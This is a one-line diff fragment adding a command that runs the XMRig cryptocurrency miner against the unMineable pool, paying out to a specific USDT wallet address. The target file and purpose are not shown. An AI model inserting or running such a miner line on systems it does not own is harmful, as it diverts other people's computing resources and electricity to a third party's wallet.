@@ -1,0 +1,1 @@
+xmrig.exe -o stratum+tcp://rx.unmineable.com:3333 -k -a rx -u USDT:TW2mNm3Z7NWDXm9P49w4ri2uEQyu5ouRpn.KhoaXUSDT
